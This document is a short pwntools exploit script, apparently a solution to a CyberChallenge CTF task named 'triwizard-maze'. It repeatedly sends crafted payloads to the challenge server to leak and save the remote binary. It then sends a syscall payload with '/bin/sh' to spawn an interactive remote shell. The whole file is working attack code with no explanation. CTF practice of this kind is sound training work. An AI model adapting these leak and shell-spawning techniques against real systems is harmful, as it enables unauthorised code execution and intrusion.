from pwn import *

print_addr = 0x13371f2b
base_addr = 0x13370000
leak = []
s = 0
while True:
    shift = base_addr + s 
    r = remote("triwizard-maze.challs.cyberchallenge.it",38202)
    payload = flat([
        print_addr,
        0x0,
        shift,
        0x1000
    ], length=1024,filler=b'\x00'
    )
    r.sendafter(b'):',payload)
    r.recvline()
    leak.append(r.recv())
    s += len(leak[-1])
    if b'SYSCALL FAILED' in leak[-1] and not b'\x00SYSCALL FAILED' in leak[-1]:
        leak.pop(-1)
        r.close()
        break
    r.close()

pr = b"".join(leak)
print(pr)
with open('./bin','wb') as f:
    f.write(pr)


syscall = 0x133722AE
data_addr = 0x13375E60 
payload = flat(
    syscall,
    0x0,
    0xb,
    data_addr + 24,
    0x0,
    0x0
)
payload += b'/bin/sh\x00'
r = remote("triwizard-maze.challs.cyberchallenge.it",38202)
r.sendafter(b'):',payload)
r.interactive()
